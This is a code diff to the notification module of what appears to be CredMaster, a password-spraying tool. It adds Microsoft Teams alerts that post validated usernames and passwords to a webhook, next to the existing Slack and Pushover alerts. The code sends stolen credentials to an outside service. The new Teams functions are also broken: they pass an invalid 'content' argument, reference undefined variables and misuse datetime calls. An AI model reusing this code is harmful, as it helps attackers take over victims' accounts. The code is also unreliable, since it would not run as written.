@@ -5,6 +5,8 @@ from datetime import datetime
 def notify_success(username, password, notify_obj):
 
     slack_webhook = notify_obj['slack_webhook']
+    # discord_webhook = notify_obj['discord_webhook']
+    teams_webhook = notify_obj['teams_webhook']
     pushover_token = notify_obj['pushover_token']
     pushover_user = notify_obj['pushover_user']
 
@@ -13,12 +15,20 @@ def notify_success(username, password, notify_obj):
 
     if pushover_token is not None and pushover_user is not None:
         pushover_notify(username, password, pushover_token, pushover_user)
+    
+    # if discord_webhook is not None:
+    #     discord_notify(username, password, discord_webhook)
+    
+    if teams_webhook is not None:
+        teams_notify(username, password, teams_webhook)
+
 
 
 def notify_update(message, notify_obj):
 
     slack_webhook = notify_obj['slack_webhook']
     discord_webhook = notify_obj['discord_webhook']
+    teams_webhook = notify_obj['teams_webhook']
     pushover_token = notify_obj['pushover_token']
     pushover_user = notify_obj['pushover_user']
 
@@ -29,8 +39,10 @@ def notify_update(message, notify_obj):
         pushover_update(message, pushover_token, pushover_user)
     
     if discord_webhook is not None:
-        discord_notify(message, discord_webhook)
-
+        discord_update(message, discord_webhook)
+    
+    if teams_webhook is not None:
+        teams_update(message, teams_webhook)
 
 # Function for posting username/password to slack channel
 def slack_notify(username, password, webhook):
@@ -75,19 +87,63 @@ def slack_update(message, webhook):
     )
 
 # Discord notify message
-def discord_notify(message, webhook):
+def discord_update(message, webhook):
     url = webhook
     data = {
     "content" : f"{message}",
     "username" : "CredMaster-Bot"
     }
-    result = requests.post(url, json = data)
-    try:
-        result.raise_for_status()
-    except requests.exceptions.HTTPError as err:
-        print(err)
-    else:
-        print("Payload delivered successfully, code {}.".format(result.status_code))
+    response = requests.post(url, json = data)
+
+# Function for posting username/password to Discord
+# def discord_notify(username, password, webhook):
+#     url = webhook
+#     data = {
+#     "content" : f"{message}",
+#     "username" : "CredMaster-Bot"
+#     }
+#     response = requests.post(url, json = data)
+
+# Teams notify function
+def teams_notify(username, password, webhook):
+    date = datetime.date()
+    time = datetime.time()
+    response = requests.post(
+        url=webhook,
+        content = ("[Valid Credentials Obtained!]\n"
+        f"User: {username}\n"
+        f"Pass: {password}\n"
+        f"Date: {date}\n"
+        f"Time: {time}"),
+        headers={"Content-Type": "application/json"},
+        json={
+            "summary": "[Valid Credentials Obtained!]",
+            "sections": [{
+                "activityTitle": "CredMaster Bot",
+                "activitySubtitle": f"{content}"
+            }],
+        },
+    ) 
+
+# Teams message notify function
+def teams_update(message, webhook):
+    date = datetime.date()
+    time = datetime.time()
+    response = requests.post(
+        url=webhook,
+        content = ("[Log Entry!]\n"
+        f"Message: {message}\n"
+        f"Date: {date}\n"
+        f"Time: {time}"),
+        headers={"Content-Type": "application/json"},
+        json={
+            "summary": "[Log Entry!]",
+            "sections": [{
+                "activityTitle": "CredMaster Bot",
+                "activitySubtitle": f"{content}"
+            }],
+        },
+    ) 
 
 # Pushover notify of valid creds
 def pushover_notify(username, password, token, user):
